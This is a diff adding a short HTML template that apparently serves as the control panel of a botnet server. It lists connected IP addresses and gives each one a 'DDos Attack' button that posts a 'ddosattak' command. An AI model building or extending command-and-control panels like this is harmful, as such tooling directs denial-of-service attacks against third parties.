@@ -1,0 +1,13 @@
+{% block body %}
+<table style="width:100%">
+    <tr>
+        <th> IP CONNECTED </th>
+        <th> comando 1 </th>
+    </tr>
+    <tr>
+        {% for item in data %}
+        <th> {{ item }} </th>
+        <th> <form action="/" method="post"> <input type="submit" name="ddosattak" value="ddosattak:{{item}}"> DDos Attack </input> </form> </th>
+        {% endfor %}
+    </tr>
+{% endblock %}
